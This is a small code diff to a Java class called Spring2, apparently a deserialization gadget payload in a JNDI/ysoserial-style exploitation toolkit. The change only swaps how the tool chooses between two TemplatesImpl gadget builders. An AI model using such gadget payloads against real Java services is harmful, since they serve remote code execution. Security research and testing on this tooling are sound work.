@@ -13,6 +13,7 @@ import javax.xml.transform.Templates;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Type;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 import static java.lang.Class.forName;
 
@@ -41,7 +42,7 @@ public class Spring2 implements ObjectPayload<Object>{
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object templates;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             templates = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             templates = Gadgets.createTemplatesImpl(type, param);
